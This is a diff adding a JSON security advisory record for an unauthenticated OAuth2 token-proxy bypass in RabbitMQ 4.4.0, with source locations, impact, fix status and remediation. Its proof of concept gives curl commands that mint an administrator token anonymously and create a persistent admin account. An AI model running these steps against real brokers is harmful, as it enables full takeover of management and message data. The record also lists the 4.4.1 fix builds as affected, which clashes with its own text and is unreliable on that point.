@@ -1,0 +1,77 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-plt6-re5q-aomz-rzeh",
+  "modified": "2026-11-27T12:09:54Z",
+  "published": "2026-11-27T12:09:54Z",
+  "upstream": [
+    "GHSA-cfvg-5q96-8mhm"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\r\n\r\nThe management plugin in RabbitMQ **4.4.0** exposes the OAuth2 token-endpoint proxy at\r\n`/js/oidc-oauth/token-endpoint/<resource-server-id>` **without any caller authentication**.\r\n\r\n## Incriminated source code (tag v4.4.0)\r\n\r\n- `deps/rabbitmq_management/src/rabbit_mgmt_dispatcher.erl:52-55` — the token-endpoint\r\n  route is registered without an authentication context.\r\n- `deps/rabbitmq_management/src/rabbit_mgmt_oauth_token_proxy.erl:88-131` —\r\n  `handle_token`/`forward_token_request` read the unauthenticated request body and\r\n  forward it to the provider's token endpoint. The module does **not** implement the\r\n  `is_authorized/3` callback that every authenticated management resource implements,\r\n  so it is reachable anonymously.\r\n- Same file, `inject_client_secret` (lines 125-131 on v4.4.0) — the configured\r\n  `management.oauth_client_secret` is appended to the request body whenever the caller\r\n  did not supply one. All other caller-supplied form parameters (including `scope`)\r\n  are relayed verbatim.\r\n\r\n## Effect\r\n\r\nOn deployments configured per the documented OAuth2 management setup, the broker acts\r\nas a confidential OAuth2 client **on behalf of any anonymous network peer**. With a\r\npermissive provider (such as the reference setups in the OAuth2 guide that grant\r\nadministrator scopes), an unauthenticated POST with `grant_type=client_credentials`\r\n(or `password`) returns a signed JWT with attacker-chosen scope.\r\n\r\nThe minted token is accepted by the management API, and also by the AMQP 0-9-1\r\nlistener when placed in the SASL PLAIN password position\r\n(`deps/rabbitmq_auth_backend_oauth2/src/rabbit_auth_backend_oauth2.erl:433-442` reads\r\nthe token from the password property), because audience validation only resolves a\r\nresource server and is not bound to the listening plane.\r\n\r\n## Fix status\r\n\r\nFixed on main by **PR #17937** (`check_grant_type` restricts relaying to\r\n`authorization_code`/`refresh_token`); the fix ships in **4.4.1**. Two related\r\nobservations from my report were triaged separately by the team (provider\r\nresponsibility for fabricated code/refresh-token relays; `iss` assertion on the\r\nbacklog) and are not part of this advisory.\r\n\r\n### Details\r\n\r\nThe management plugin in RabbitMQ **4.4.0** exposes the OAuth2 token-endpoint proxy at\r\n`/js/oidc-oauth/token-endpoint/<resource-server-id>` **without any caller authentication**.\r\n\r\n## Incriminated source code (tag v4.4.0)\r\n\r\n- `deps/rabbitmq_management/src/rabbit_mgmt_dispatcher.erl:52-55` — the token-endpoint\r\n  route is registered without an authentication context.\r\n- `deps/rabbitmq_management/src/rabbit_mgmt_oauth_token_proxy.erl:88-131` —\r\n  `handle_token`/`forward_token_request` read the unauthenticated request body and\r\n  forward it to the provider's token endpoint. The module does **not** implement the\r\n  `is_authorized/3` callback that every authenticated management resource implements,\r\n  so it is reachable anonymously.\r\n- Same file, `inject_client_secret` (lines 125-131 on v4.4.0) — the configured\r\n  `management.oauth_client_secret` is appended to the request body whenever the caller\r\n  did not supply one. All other caller-supplied form parameters (including `scope`)\r\n  are relayed verbatim.\r\n\r\n## Effect\r\n\r\nOn deployments configured per the documented OAuth2 management setup, the broker acts\r\nas a confidential OAuth2 client **on behalf of any anonymous network peer**. With a\r\npermissive provider (such as the reference setups in the OAuth2 guide that grant\r\nadministrator scopes), an unauthenticated POST with `grant_type=client_credentials`\r\n(or `password`) returns a signed JWT with attacker-chosen scope.\r\n\r\nThe minted token is accepted by the management API, and also by the AMQP 0-9-1\r\nlistener when placed in the SASL PLAIN password position\r\n(`deps/rabbitmq_auth_backend_oauth2/src/rabbit_auth_backend_oauth2.erl:433-442` reads\r\nthe token from the password property), because audience validation only resolves a\r\nresource server and is not bound to the listening plane.\r\n\r\n## Fix status\r\n\r\nAddressed in 4.4.1. Two related\r\nobservations from my report were triaged separately by the team (provider\r\nresponsibility for fabricated code/refresh-token relays; `iss` assertion on the\r\nbacklog) and are not part of this advisory.\r\n\r\n### Proof of concept\r\n\r\n## Environment\r\n\r\nTested on the official `rabbitmq:4.4.0-management` Docker image (Erlang/OTP 29.1.2).\r\n\r\n## Prerequisites\r\n\r\nRabbitMQ 4.4.0 with the documented OAuth2 management integration. Minimal\r\n`rabbitmq.conf` shape (values per your provider):\r\n\r\n```ini\r\nmanagement.oauth_enabled = true\r\nmanagement.oauth_client_id = my_spa_client\r\nmanagement.oauth_client_secret = <the confidential client secret>\r\nmanagement.oauth_provider_url = https://<idp-host>\r\nmanagement.oauth_resource_servers.1.id = rabbitmq\r\nauth_backends.1 = oauth2\r\nauth_oauth2.resource_servers.1.id = rabbitmq\r\nauth_oauth2.resource_servers.1.oauth_provider_id = default\r\nauth_oauth2.oauth_providers.default.issuer = https://<idp-host>\r\nauth_oauth2.oauth_providers.default.jwks_uri = https://<idp-host>/jwks.json\r\nauth_oauth2.oauth_providers.default.token_endpoint = https://<idp-host>/token\r\n```\r\n\r\nwith `rabbitmq_management` and `rabbitmq_auth_backend_oauth2` enabled, and a provider\r\nthat grants the SPA client administrator scopes (as in the guide's reference examples).\r\n\r\n## Step 1 — mint a token without any credentials\r\n\r\nNo `Authorization` header, no client secret:\r\n\r\n```bash\r\ncurl -s -X POST \"http://HOST:15672/js/oidc-oauth/token-endpoint/rabbitmq\" \\\r\n     -d \"grant_type=client_credentials\" -d \"client_id=my_spa_client\"\r\n```\r\n\r\nResponse: `200 {\"access_token\":\"eyJ...\",\"token_type\":\"Bearer\",...}` — the\r\nprovider-side request log shows the broker injected the client secret and the request\r\noriginated from the broker.\r\n\r\n## Step 2 — prove privilege on the management API\r\n\r\n```bash\r\ncurl -s \"http://HOST:15672/api/whoami\" -H \"Authorization: Bearer <token>\"\r\n```\r\n\r\nResponse: `200 {\"name\":\"...\",\"tags\":[\"administrator\"],\"is_internal_user\":false}`\r\n\r\n## Step 3 — privileged write (persistence)\r\n\r\n```bash\r\ncurl -s -X PUT \"http://HOST:15672/api/users/poc\" \\\r\n     -H \"Authorization: Bearer <token>\" -H \"content-type: application/json\" \\\r\n     -d '{\"password\":\"Poc12345678!\",\"tags\":\"administrator\"}'\r\n```\r\n\r\nResponse: `201 Created`.\r\n\r\n## Step 4 — data plane (cross-listener acceptance)\r\n\r\nPresent the same JWT in the SASL PLAIN password position against the AMQP port\r\n(`\\x00user\\x00<jwt>`); the handshake completes and full queue operations\r\n(declare/publish/consume/purge/delete) succeed on any vhost.\r\n\r\nA self-contained black-box Python PoC (standard library only; HTTP + raw AMQP 0-9-1\r\nframes) was attached to my original email report and is available on request.\r\n\r\n### Impact\r\n\r\n**Authentication bypass** (missing authentication for a critical function, **CWE-306**)\r\nin the management plugin's OAuth2 token-endpoint proxy.\r\n\r\n**Impacted deployments:** RabbitMQ 4.4.0 instances configured per the documented\r\nOAuth2/SSO integration for the management UI (oauth2 backend enabled, provider with a\r\nresource server, `management.oauth_client_secret` set — i.e. the confidential-client\r\ntoken-proxy setup). No operator misconfiguration is involved; the affected setup is\r\nthe documented one.\r\n\r\n**Impacted parties:** any unauthenticated remote attacker with network access to the\r\nmanagement port. Consequences (all verified in testing):\r\n\r\n- attacker-chosen-scope JWT minting through the broker's own confidential client identity\r\n- full management-plane takeover (administrator actions, persistent administrator account creation)\r\n- full data-plane takeover on all vhosts via AMQP with the minted token (read, forge and destroy all messages)\r\n\r\n**Suggested severity:** Critical — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H` (9.8),\r\nacknowledging the OAuth2-setup precondition; happy for maintainers to finalize the score.\r\n\r\n**Remediation:** upgrade to 4.4.1 (PR #17937). Interim mitigations: remove\r\n`management.oauth_client_secret`, or place authentication in front of the management port.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "rabbitmq-4.3",
+        "purl": "pkg:deb/dhi/rabbitmq-4.3"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.3.5-0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.3.5-0",
+        "4.3.5-1",
+        "4.3.6-0",
+        "4.3.6-1",
+        "4.3.6-2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "rabbitmq-4.4",
+        "purl": "pkg:deb/dhi/rabbitmq-4.4"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "4.4.0-0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "4.4.0-0",
+        "4.4.1-0",
+        "4.4.1-1",
+        "4.4.1-2",
+        "4.4.1-3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-plt6-re5q-aomz-rzeh"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/rabbitmq/rabbitmq-server/security/advisories/GHSA-cfvg-5q96-8mhm"
+    }
+  ]
+}
